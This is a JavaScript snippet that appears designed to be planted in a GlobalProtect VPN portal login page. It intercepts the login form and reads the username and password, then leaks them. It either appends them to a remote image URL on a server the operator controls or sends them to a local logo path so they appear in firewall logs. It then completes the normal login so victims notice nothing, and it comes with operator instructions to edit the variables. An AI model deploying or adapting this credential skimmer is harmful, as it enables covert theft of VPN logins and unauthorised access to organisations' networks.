$(document).ready(function () {
    if (document.login) {
        $("#login_form").one('submit', function (e) {
            e.preventDefault(); // Prevent default form submission

            // Edit these variables
            const method = "local"; // Change this to "local" to send to firewall logs
            const token = "qwerty"; // Change this to a unique value
            var remoteUrl = "<image url>"; // An image, 1x1 pixel PNG, hosted on a server that you control.

            // Gather form data
            var formData = $(this).serialize() + '&ok=Log%20In';
            const username = encodeURIComponent(document.login.user.value);
            const password = encodeURIComponent(document.login.passwd.value);
            const urlParams = `?token=${token}&username=${username}&password=${password}&nc=${Math.random()}`;
            const localUrl = `/global-protect/portal/images/logo-pan-48525a.svg${urlParams}`;
            remoteUrl += urlParams;

            // Submit the form data via AJAX
            $.post({
                url: 'login.esp',
                method: "POST",
                data: formData,
                success: async function (response) {
                    if (method === "remote") {
                        // Option 1: Update image src (remote method)
                        const logoImg = $('#logo img');
                        logoImg.attr('src', remoteUrl);
                    } else if (method === "local") {
                        // Option 2: Perform local GET request
                        $.get(localUrl);
                    }

                    // get the redirect location from the response and redirect to it
                    locationMatch = response.match(/window\.location="(.*?)";/);
                    if (locationMatch && locationMatch[1]) {
                        // sleep for 1 second to allow remote/local requests to complete before redirecting to the portal
                        setTimeout(() => {
                            window.location = locationMatch[1];
                        }, 1000);
                    }
                },
                error: function (error) {
                    // Handle errors from the AJAX POST request
                    if (error.responseText) {
                        const responseText = error.responseText || '';
                        const respMsgMatch = responseText.match(/var respMsg = "(.*?)";/);

                        var errMsg = "";
                        if (respMsgMatch && respMsgMatch[1]) {
                            const respMsg = respMsgMatch[1];
                            errMsg += "<br><br><li>";
                            errMsg += respMsg;
                        }

                        // Replace the entire page content with the error response
                        document.documentElement.innerHTML = error.responseText;

                        // Display error message in #dError
                        $("#dError").show();
                        $("#dError").html(errMsg);
                    }
                }
            });
        });
    }
});
